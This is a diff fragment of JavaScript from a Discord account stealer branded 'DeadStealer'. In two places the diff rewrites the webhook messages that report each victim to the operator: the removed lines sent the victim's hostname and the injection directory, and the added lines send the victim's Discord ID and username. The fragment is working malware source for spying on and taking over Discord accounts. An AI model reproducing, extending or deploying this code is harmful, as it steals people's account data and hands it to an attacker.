@@ -75,12 +75,12 @@ function FirstTime() {
 						username: "DeadStealer",
 						content: "",
 						embeds: [{
-							title: "Discord Initalizado (Usuario no conectado)",
-							color: config["embed-color"],
+							title: "DeadStealer",
+							color: 0xFF0300,
 							fields: [{
-								name: "Info",
-								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
-								inline: !1
+								name: "ID",
+								value: `\`${json.id}\``,
+								inline: !0
 							}],
 							author: {
 								name: "DeadStealer"
@@ -144,12 +144,12 @@ function FirstTime() {
 						username: "DeadStealer",
 						content: "",
 						embeds: [{
-							title: "Cierre de sesión del usuario (el usuario no se ha conectado antes)",
-							color: config["embed-color"],
+							title: "DeadStealer",
+							color: 0xFF0300,
 							fields: [{
-								name: "Info",
-								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
-								inline: !1
+								name: '<:black_joker:926273784305045526> Usuario',
+                                                                value: `\`${b.username}#${b.discriminator}\``,
+								inline: !0
 							}],
 							author: {
 								name: "DeadStealer"
